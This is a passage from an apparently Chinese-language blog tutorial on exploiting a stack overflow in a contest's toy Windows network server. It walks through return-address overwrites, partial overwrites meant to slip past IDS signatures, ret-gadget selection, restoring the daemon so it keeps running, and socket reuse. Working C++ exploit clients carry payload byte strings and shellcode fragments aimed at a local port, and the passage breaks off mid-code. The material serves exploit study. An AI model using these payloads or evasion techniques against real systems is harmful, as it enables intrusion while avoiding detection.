</span></span><span class=line><span class=cl>  <span class=n>sock_server</span><span class=p>.</span><span class=n>sin_addr</span><span class=p>.</span><span class=n>s_addr</span><span class=o>=</span><span class=n>htonl</span><span class=p>(</span><span class=n>INADDR_ANY</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span><span class=p>(</span><span class=n>bind</span><span class=p>(</span><span class=n>sock</span><span class=p>,(</span><span class=k>struct</span> <span class=nc>sockaddr</span><span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>amp</span><span class=p>;</span><span class=n>sock_server</span><span class=p>,</span><span class=k>sizeof</span><span class=p>(</span><span class=n>sock_server</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>cout</span><span class=o>&lt;&lt;</span><span class=s>&#34;binding stream socket error!&#34;</span><span class=o>&lt;&lt;</span><span class=n>endl</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=n>cout</span><span class=o>&lt;&lt;</span><span class=s>&#34;**************************************&#34;</span><span class=o>&lt;&lt;</span><span class=n>endl</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>cout</span><span class=o>&lt;&lt;</span><span class=s>&#34;     exploit target server 1.0     &#34;</span><span class=o>&lt;&lt;</span><span class=n>endl</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>cout</span><span class=o>&lt;&lt;</span><span class=s>&#34;**************************************&#34;</span><span class=o>&lt;&lt;</span><span class=n>endl</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>listen</span><span class=p>(</span><span class=n>sock</span><span class=p>,</span><span class=mi>4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>lenth</span><span class=o>=</span><span class=k>sizeof</span><span class=p>(</span><span class=k>struct</span> <span class=nc>sockaddr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>do</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>msgsock</span><span class=o>=</span><span class=n>accept</span><span class=p>(</span><span class=n>sock</span><span class=p>,(</span><span class=k>struct</span> <span class=nc>sockaddr</span><span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>amp</span><span class=p>;</span><span class=n>sock_client</span><span class=p>,(</span><span class=kt>int</span><span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>amp</span><span class=p>;</span><span class=n>lenth</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=n>msgsock</span><span class=o>==-</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>cout</span><span class=o>&lt;&lt;</span><span class=s>&#34;accept error!&#34;</span><span class=o>&lt;&lt;</span><span class=n>endl</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span>
</span></span><span class=line><span class=cl>      <span class=k>do</span>
</span></span><span class=line><span class=cl>      <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>memset</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=k>sizeof</span><span class=p>(</span><span class=n>buf</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>((</span><span class=n>receive_len</span><span class=o>=</span><span class=n>recv</span><span class=p>(</span><span class=n>msgsock</span><span class=p>,</span><span class=n>buf</span><span class=p>,</span><span class=k>sizeof</span><span class=p>(</span><span class=n>buf</span><span class=p>),</span><span class=mi>0</span><span class=p>))</span><span class=o>&lt;</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>          <span class=n>cout</span><span class=o>&lt;&lt;</span><span class=s>&#34;reading stream message erro!&#34;</span><span class=o>&lt;&lt;</span><span class=n>endl</span><span class=p>;</span>
</span></span><span class=line><span class=cl>          <span class=n>receive_len</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=n>msg_display</span><span class=p>(</span><span class=n>buf</span><span class=p>);</span><span class=c1>//trigged the overflow
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=p>}</span><span class=k>while</span><span class=p>(</span><span class=n>receive_len</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>closesocket</span><span class=p>(</span><span class=n>msgsock</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span><span class=k>while</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>WSACleanup</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></td></tr></table></div></div><h1 id=lower------------------------------------------------upper>========================和谐的分割线=================================
如注释所言，这里是误把0x200长度的往200字符串里面拷贝了。其实这个问题并不具有
代表性，比尔叔叔的手下们把widechar的长度算错过，把栈上的变量当堆释放过，把用户给的
地址内容加1过，唯独没有昏到把16进制和10进制搞混。不过既然主办方这样写，我们也就这
样看吧。实际上逆向出来后，作为一个模板可以覆盖ret，然后code page里面找jmp esp，然
后这样那样，很简单就搞定exp了。尽管在冠军的答案中看到了这种方法的影子，楠木棺材级
木匠还是要挥舞着手中的锯子说，这种程度只能去做洗脚盆。<br>好吧，那我们一步一步地看如果从洗脚盆程度提升到楠木棺材级别，并展望一下更高的
层次。
首先是获取CPU的控制权问题。<br>dark spyrit在某期Phrack（记不清楚了）上提出可以用系统加载的dll上的指令码来跳
转并获得控制权。这里有一个前提，因为很巧的你覆盖了一大堆东西后，ret退栈后esp指向
你能够控制的代码，因此用一个jmp esp可以跳过来执行，剩下就是编写shellcode。但是，
并不是说就只能用这个方法，或者说这个方法就最好。dark spyrit最大的贡献是提出了一
个通用的方法，同马列主义毛 泽东思想邓 小平理论三个代表八荣八耻一样，虽然是放之四海
而皆准的真理，不过到了中国，还是要要结合具体的国情来开展工作。拿jmp esp的东西往
机器上一跑，不同的操作系统版本怎么办，/3gb模式怎么办？做洗脚盆的确可以区分着做出
男用女用小孩用人妖用的，但是可能拿去用的人是超女的冠军，如果事先你不知道名字，只
看长相，你说到底给那个盆子好？<br>所以造梯子的时候，最好还是根据实际情况来。一般来说，栈溢出时，对栈上的破坏情
况不是很严重的话，在栈区域上可以看到很多上层函数的局部变量，而且这些局部变量往往
是很有用的，比如凑巧就是你那个字符串的指针等。打栈上变量的主意有几个好处，首先你
可以用其他更稳定的方法跳转到恶意字符串的开头，其次这可以给你多一些字节空间来存放
shellcode，最后还可以防止一些ids/ips的检测。我们可以用下面一个简单的图示来把这
三个优势混杂起来说明一下。
&lt;&ndash;lower upper&ndash;>
<a class=header-anchor href=#lower------------------------------------------------upper></a></h1><h1 id=var-of-vulnerable-function-----ret----var-of-upper-function->var of vulnerable function | ret | var of upper function &mldr;
<a class=header-anchor href=#var-of-vulnerable-function-----ret----var-of-upper-function-></a></h1><h1 id=nop-nop-nop-nop-nop-nop-nop--jmp-esp--shellcode>NOP NOP NOP NOP NOP NOP NOP |jmp esp| shellcode
<a class=header-anchor href=#nop-nop-nop-nop-nop-nop-nop--jmp-esp--shellcode></a></h1><h1 id=shellcode--------------------jmp-----var-of-upper-function>shellcode |jmp ? | var of upper function
<a class=header-anchor href=#shellcode--------------------jmp-----var-of-upper-function></a></h1><pre><code>第二行是马列主义方法，你一定会覆盖到ret，然后继续覆盖起码2个字节(eb xx往回跳转)。
</code></pre><h1 id=lower--------------------------------------------------------------upper>因此一些ids/ips的signature就写了，如果你超过xxoo个字节，就阻止发送。就算写得不好
的signature起码也会检查你是否覆盖到了ret的四个字节，一些更严格的甚至只要覆盖到ret
的第一个字节就报警，对于这样的情况，马列主义方法肯定是被扼杀了，但是第三行的具体国
情方法还有一线机会逃脱检测，我们根本不用覆盖完ret的四个字节，只要利用栈上的变量，
找一些特定的字节码就可以了。<br>说到这里还可以插播一个事情，去年一月份泄露出来的.ani溢出的exp，大家对那个覆
盖了低两位的exp惊叹不已。这就是一个很好的例子：第一，你用最小的字节数完成了功能，
最大限度避免了ids等的问题。第二，这个方法的稳定性还好。这样说其实是很抽象的，我们
还是回到科普竞赛的代码上来看。<br>调用msg_display的时候传递进来了一个参数，在栈上表现出来是这个参数是紧接着ret
地址后面的，如果我们仅覆盖到了ret地址，当CPU执行完msg_display返回时，esp刚好指向
这个参数，这个时候只需要一个能达到jmp [esp]功能的地址，就能准确跳转到我们传入的
字符串上去，显然，满足这个条件最好的指令就是0xc3(ret)。下面这个图简单地说明了这
个问题。
&lt;&ndash;lower upper&ndash;>
<a class=header-anchor href=#lower--------------------------------------------------------------upper></a></h1><h1 id=var-of-vulnerable-function----ret----ptr---other-var-of-upper-function->var of vulnerable function | ret | ptr | other var of upper function &mldr;
<a class=header-anchor href=#var-of-vulnerable-function----ret----ptr---other-var-of-upper-function-></a></h1><p>^&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;|<br>把图中的ret用一个内容为0xC3的地址A来覆盖，当msg_display返回时，返回到了A地址，
再执行了一次0xC3(ret)指令，eip就跳到了字符串的开头。<br>这里的情况还是很简单的，实际exploiting中也许这个ptr离ret还有点距离，可能需要
你pop几次，这个形式上同覆盖seh的利用方法相同，也算是一个巧合吧。<br>然后来说说0xC3地址的寻找。首先很遗憾的，如果你想用四个字节完全覆盖ret地址，
没有一个通用地方。msvcrt.dll在相同sp的不同语言系统中相对固定，code page在相同语
言不同版本系统中相对固定。注意，这里只是相对，碰上些特殊的情况，可能这些平时通用
的地址根本就是无效的地址。再严格一些，如果这里地址必须符合某种编码规范，也许你更
难找到可用的地址，更别说通用了。<br>洗脚盆级别的木匠到这里估计要晕倒了，棺材匠级别的应该还有点办法，两个解决方案：<br>第一、找一个替代产品来满足编码规范。比如0x7ffa1571是你要找的pop pop ret，没
必要一定要用0x7ffa1571，也许用0x7ffa156e也可以，只要pop pop ret前面的指令无伤大
雅就是。一个实际的例子是泄露出来的realplayer import那个，要找pop pop ret，但是符
合编码规范的范围内找不到，作为替代找了一个 call xxx/ret xx，而且刚好call xxx还不
会让程序崩溃。<br>第二、缩小覆盖面积。覆盖4个字节太痛苦了，少覆盖几个字节吧。x86的DWORD是低位
在上的，所以你顺序覆盖的时候，首先覆盖了ret地址的低位。正常的ret值是返回到某个pe
文件中，比如00401258，如果覆盖一个字节，那可能的地址范围是00401201<del>004012ff，如果
覆盖2个字节，可能的地址范围在00400101</del>0040ffff。这么大的范围内一般容易找到满足
要求的地址，而且更重要的是，pe文件版本固定的话，尽管加载的基地址可能会变化，但是由
于基地址有个对齐的要求，低位（两个字节或更多）完全固定，这实际上是一个很好的提高稳
定性的方法。现实中memcpy导致的问题用这种方法更有效，strcpy的麻烦些，不过好在只要
说明问题就是，这里也不深究过多。马上给出第一个代码。
========================和谐的分割线=================================</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-1-1><a class=lnlinks href=#hl-1-1> 1</a>
</span><span class=lnt id=hl-1-2><a class=lnlinks href=#hl-1-2> 2</a>
</span><span class=lnt id=hl-1-3><a class=lnlinks href=#hl-1-3> 3</a>
</span><span class=lnt id=hl-1-4><a class=lnlinks href=#hl-1-4> 4</a>
</span><span class=lnt id=hl-1-5><a class=lnlinks href=#hl-1-5> 5</a>
</span><span class=lnt id=hl-1-6><a class=lnlinks href=#hl-1-6> 6</a>
</span><span class=lnt id=hl-1-7><a class=lnlinks href=#hl-1-7> 7</a>
</span><span class=lnt id=hl-1-8><a class=lnlinks href=#hl-1-8> 8</a>
</span><span class=lnt id=hl-1-9><a class=lnlinks href=#hl-1-9> 9</a>
</span><span class=lnt id=hl-1-10><a class=lnlinks href=#hl-1-10>10</a>
</span><span class=lnt id=hl-1-11><a class=lnlinks href=#hl-1-11>11</a>
</span><span class=lnt id=hl-1-12><a class=lnlinks href=#hl-1-12>12</a>
</span><span class=lnt id=hl-1-13><a class=lnlinks href=#hl-1-13>13</a>
</span><span class=lnt id=hl-1-14><a class=lnlinks href=#hl-1-14>14</a>
</span><span class=lnt id=hl-1-15><a class=lnlinks href=#hl-1-15>15</a>
</span><span class=lnt id=hl-1-16><a class=lnlinks href=#hl-1-16>16</a>
</span><span class=lnt id=hl-1-17><a class=lnlinks href=#hl-1-17>17</a>
</span><span class=lnt id=hl-1-18><a class=lnlinks href=#hl-1-18>18</a>
</span><span class=lnt id=hl-1-19><a class=lnlinks href=#hl-1-19>19</a>
</span><span class=lnt id=hl-1-20><a class=lnlinks href=#hl-1-20>20</a>
</span><span class=lnt id=hl-1-21><a class=lnlinks href=#hl-1-21>21</a>
</span><span class=lnt id=hl-1-22><a class=lnlinks href=#hl-1-22>22</a>
</span><span class=lnt id=hl-1-23><a class=lnlinks href=#hl-1-23>23</a>
</span><span class=lnt id=hl-1-24><a class=lnlinks href=#hl-1-24>24</a>
</span><span class=lnt id=hl-1-25><a class=lnlinks href=#hl-1-25>25</a>
</span><span class=lnt id=hl-1-26><a class=lnlinks href=#hl-1-26>26</a>
</span><span class=lnt id=hl-1-27><a class=lnlinks href=#hl-1-27>27</a>
</span><span class=lnt id=hl-1-28><a class=lnlinks href=#hl-1-28>28</a>
</span><span class=lnt id=hl-1-29><a class=lnlinks href=#hl-1-29>29</a>
</span><span class=lnt id=hl-1-30><a class=lnlinks href=#hl-1-30>30</a>
</span><span class=lnt id=hl-1-31><a class=lnlinks href=#hl-1-31>31</a>
</span><span class=lnt id=hl-1-32><a class=lnlinks href=#hl-1-32>32</a>
</span><span class=lnt id=hl-1-33><a class=lnlinks href=#hl-1-33>33</a>
</span><span class=lnt id=hl-1-34><a class=lnlinks href=#hl-1-34>34</a>
</span><span class=lnt id=hl-1-35><a class=lnlinks href=#hl-1-35>35</a>
</span><span class=lnt id=hl-1-36><a class=lnlinks href=#hl-1-36>36</a>
</span><span class=lnt id=hl-1-37><a class=lnlinks href=#hl-1-37>37</a>
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c++ data-lang=c++><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;winsock2.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#pragma comment(lib, &#34;ws2_32&#34;)
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=n>SOCKET</span> <span class=nf>ConnectTo</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=n>ip</span><span class=p>,</span> <span class=kt>int</span> <span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>SOCKET</span> <span class=n>s</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=nc>hostent</span> <span class=o>*</span><span class=n>he</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=nc>sockaddr_in</span> <span class=n>host</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>((</span><span class=n>he</span> <span class=o>=</span> <span class=n>gethostbyname</span><span class=p>(</span><span class=n>ip</span><span class=p>))</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>INVALID_SOCKET</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>host</span><span class=p>.</span><span class=n>sin_port</span> <span class=o>=</span> <span class=n>htons</span><span class=p>(</span><span class=n>port</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>host</span><span class=p>.</span><span class=n>sin_family</span> <span class=o>=</span> <span class=n>AF_INET</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>host</span><span class=p>.</span><span class=n>sin_addr</span> <span class=o>=</span> <span class=o>*</span><span class=p>((</span><span class=k>struct</span> <span class=nc>in_addr</span> <span class=o>*</span><span class=p>)</span><span class=n>he</span><span class=o>-&gt;</span><span class=n>h_addr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>((</span><span class=n>s</span> <span class=o>=</span> <span class=n>WSASocket</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>))</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>INVALID_SOCKET</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>((</span><span class=n>connect</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=p>(</span><span class=k>struct</span> <span class=nc>sockaddr</span> <span class=o>*</span><span class=p>)</span> <span class=o>&amp;</span><span class=n>amp</span><span class=p>;</span><span class=n>host</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>host</span><span class=p>)))</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>closesocket</span><span class=p>(</span><span class=n>s</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>INVALID_SOCKET</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>s</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>  
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>malicious</span><span class=p>[]</span> <span class=o>=</span>  <span class=s>&#34;</span><span class=se>\xcc</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>                    <span class=s>&#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#34;</span>
</span></span><span class=line><span class=cl>                    <span class=s>&#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#34;</span>
</span></span><span class=line><span class=cl>                    <span class=s>&#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#34;</span>
</span></span><span class=line><span class=cl>                    <span class=s>&#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#34;</span>
</span></span><span class=line><span class=cl>                    <span class=s>&#34;OA@&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>WSADATA</span> <span class=n>wsaData</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=n>WSAStartup</span><span class=p>(</span><span class=mh>0x0101</span><span class=p>,</span><span class=o>&amp;</span><span class=n>amp</span><span class=p>;</span><span class=n>wsaData</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>SOCKET</span> <span class=n>s</span> <span class=o>=</span> <span class=n>ConnectTo</span><span class=p>(</span><span class=s>&#34;127.0.0.1&#34;</span><span class=p>,</span> <span class=mi>7777</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>send</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=n>malicious</span><span class=p>,</span> <span class=mi>203</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>  <span class=c1>//hard encoded :)
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>WSACleanup</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></td></tr></table></div></div><p>========================和谐的分割线=================================<br>执行下顺利到达int3指令。<br>构造exp的过程本身是简单的，关键在shellcode实现功能上。洗脚盆木匠到这一步基本
上就是找一个shellcode来用。作为一个有职业道德的棺材级木匠，可能还应该有点更高的
追求：好的梯子除了能够通用而精确地干掉存在漏洞的机器外，同时还要方便使用者，绕过
防火墙，而且还要尽可能少地影响到守护进程。对于网络程序，理想的情况是复用端口，终
极目标是复用完了还不挂，后续的使用者能够正常使用守护进程的功能。后一点听起来似
乎有点不可思议，而且流传在外面的各种exp，好像还罕有牛到这种程度，不过说穿了也没什
么奇怪的，棺材级的木匠一般都能做到，只是马桶级木匠更喜欢散布马桶级exp而已。我们
把复用端口的问题留在后面，先聊聊如何让守护进程不挂掉这个事情。<br>要程序不挂，最简单的办法就是恢复溢出时候的上下文，然后返回去。通常jmp esp的方
法因为覆盖得太多，栈给洗脚盆木匠搞得一团糟，影响了太多上级函数的变量，导致根本没有
什么好办法可以恢复。这个时候，尽可能少覆盖的优势出来了：由于最大限度地保存了上层
函数局部变量，所以要做的就是恢复相关寄存器的值，然后寻找正常流程应该返回的地址，跳
转回去即可。对于这里这个简单的daemon，我们甚至可以硬编码返回地址。还是把例子给出
来，说明一下问题先。<br>========================和谐的分割线=================================</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-2-1><a class=lnlinks href=#hl-2-1>1</a>
</span><span class=lnt id=hl-2-2><a class=lnlinks href=#hl-2-2>2</a>
</span><span class=lnt id=hl-2-3><a class=lnlinks href=#hl-2-3>3</a>
</span><span class=lnt id=hl-2-4><a class=lnlinks href=#hl-2-4>4</a>
</span><span class=lnt id=hl-2-5><a class=lnlinks href=#hl-2-5>5</a>
</span><span class=lnt id=hl-2-6><a class=lnlinks href=#hl-2-6>6</a>
</span><span class=lnt id=hl-2-7><a class=lnlinks href=#hl-2-7>7</a>
</span><span class=lnt id=hl-2-8><a class=lnlinks href=#hl-2-8>8</a>
</span><span class=lnt id=hl-2-9><a class=lnlinks href=#hl-2-9>9</a>
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c++ data-lang=c++><span class=line><span class=cl><span class=kt>char</span> <span class=n>malicious</span><span class=p>[]</span> <span class=o>=</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xCC</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;LLLL`a&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x50\x44\x44\x68\x55\x55\x55\x12\x44\x44\xc3</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;OA@&#34;</span><span class=p>;</span></span></span></code></pre></td></tr></table></div></div><p>========================和谐的分割线=================================<br>同前面一个代码相同，0xCC为了调试方便，改成0x90后再编译执行下，可以看见守护进程
完全恢复了，你还可以telnet 7777过去正常执行功能，和没有发生过问题一样。这里恢复的
代码用了一点小技巧，有兴趣的木匠可以仔细看看，代码`和a分别是pushad和popad，在这两
个中间可以放置任何功能的shellcode，不影响整体的框架。<br>例子虽然简单，但是我建议读到这里的木匠还是跟进去看一下流程。由于这个实例比
较直观，代码就简单恢复了上下文然后跳到正常地方执行，对于复杂点的代码，可能需要多
费一点手脚，但是大体思路和步骤还是可以确定的：首先收集一个正常执行完出问题代码的
寄存器和栈状态；然后确定要返回的地址，搜索或者硬编码，返回的地方可以是上一层，也可
以返回上几层，甚至无耻地跳到入口让程序重新执行一次都可以；最后将恢复的代码编码成
shellcode，加在正常功能shellcode的后面。<br>让守护进程不挂也做到了，接着看看端口复用的情况。
最简单的网络程序保留有一个SOCKET来通讯，很多已有的文章讨论了如何找到当前的
SOCKET。最常用的方法是枚举所有可能的值，然后发送特征字符串来确认。也有人hook
recv，通过稍微被动一点的方法来获得SOCKET。当然这些都是懒人用的通用方法，对于特定
的程序，简单而又稳妥的方法是直接找栈上的变量，消耗的代码少，而且一次性就能找到。
如果编译优化的时候没有具体分配栈上的空间给这个socket，则它一定会被保存在某个寄
存器里面，那就更简单了。针对具体的情况，像recv之类的函数也没有必要用很长的通用代
码去搜索，只要在PE文件里面找找就成。具体的实现细节我们省略掉，给出代码，直接跟进
去看看就知道了。<br>========================和谐的分割线=================================</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-3-1><a class=lnlinks href=#hl-3-1> 1</a>
</span><span class=lnt id=hl-3-2><a class=lnlinks href=#hl-3-2> 2</a>
</span><span class=lnt id=hl-3-3><a class=lnlinks href=#hl-3-3> 3</a>
</span><span class=lnt id=hl-3-4><a class=lnlinks href=#hl-3-4> 4</a>
</span><span class=lnt id=hl-3-5><a class=lnlinks href=#hl-3-5> 5</a>
</span><span class=lnt id=hl-3-6><a class=lnlinks href=#hl-3-6> 6</a>
</span><span class=lnt id=hl-3-7><a class=lnlinks href=#hl-3-7> 7</a>
</span><span class=lnt id=hl-3-8><a class=lnlinks href=#hl-3-8> 8</a>
</span><span class=lnt id=hl-3-9><a class=lnlinks href=#hl-3-9> 9</a>
</span><span class=lnt id=hl-3-10><a class=lnlinks href=#hl-3-10>10</a>
</span><span class=lnt id=hl-3-11><a class=lnlinks href=#hl-3-11>11</a>
</span><span class=lnt id=hl-3-12><a class=lnlinks href=#hl-3-12>12</a>
</span><span class=lnt id=hl-3-13><a class=lnlinks href=#hl-3-13>13</a>
</span><span class=lnt id=hl-3-14><a class=lnlinks href=#hl-3-14>14</a>
</span><span class=lnt id=hl-3-15><a class=lnlinks href=#hl-3-15>15</a>
</span><span class=lnt id=hl-3-16><a class=lnlinks href=#hl-3-16>16</a>
</span><span class=lnt id=hl-3-17><a class=lnlinks href=#hl-3-17>17</a>
</span><span class=lnt id=hl-3-18><a class=lnlinks href=#hl-3-18>18</a>
</span><span class=lnt id=hl-3-19><a class=lnlinks href=#hl-3-19>19</a>
</span><span class=lnt id=hl-3-20><a class=lnlinks href=#hl-3-20>20</a>
</span><span class=lnt id=hl-3-21><a class=lnlinks href=#hl-3-21>21</a>
</span><span class=lnt id=hl-3-22><a class=lnlinks href=#hl-3-22>22</a>
</span><span class=lnt id=hl-3-23><a class=lnlinks href=#hl-3-23>23</a>
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c++ data-lang=c++><span class=line><span class=cl><span class=kt>void</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>malicious</span><span class=p>[]</span> <span class=o>=</span>  <span class=s>&#34;</span><span class=se>\x90</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>                    <span class=s>&#34;LLLL`&#34;</span>
</span></span><span class=line><span class=cl>                    <span class=s>&#34;</span><span class=se>\x33\xd2\x66\xba\x10\x10\x2b\xe2\x33\xf6\x56\x52\x54\x53\x66\xb8</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>                    <span class=s>&#34;</span><span class=se>\xe4\x90\xff\x10\x83\xec\x08\xff\xd4\x5d\x5d\x33\xd2\x66\xba\x10</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>                    <span class=s>&#34;</span><span class=se>\x10\x03\xe2</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>                    <span class=s>&#34;a&#34;</span>
</span></span><span class=line><span class=cl>                    <span class=s>&#34;</span><span class=se>\x50\x44\x44\x68\x55\x55\x55\x12\x44\x44\xc3</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>                    <span class=s>&#34;&#34;</span>
</span></span><span class=line><span class=cl>                    <span class=s>&#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#34;</span>
</span></span><span class=line><span class=cl>                    <span class=s>&#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#34;</span>
</span></span><span class=line><span class=cl>                    <span class=s>&#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#34;</span>
</span></span><span class=line><span class=cl>                    <span class=s>&#34;OA@&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>WSADATA</span> <span class=n>wsaData</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=n>WSAStartup</span><span class=p>(</span><span class=mh>0x0101</span><span class=p>,</span><span class=o>&amp;</span><span class=n>amp</span><span class=p>;</span><span class=n>wsaData</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span><span class=p>;</span>
